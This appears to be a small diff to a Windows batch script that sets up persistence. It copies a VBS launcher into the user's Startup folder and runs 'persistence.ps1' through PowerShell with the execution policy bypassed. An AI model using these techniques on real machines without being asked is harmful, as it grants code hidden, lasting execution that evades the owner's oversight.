@@ -1,2 +1,4 @@
 @echo off
-start /min  C:\Python\python persistence.py
+copy run_python_script.vbs "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+powershell -ExecutionPolicy Bypass -File "%~dp0persistence.ps1" 
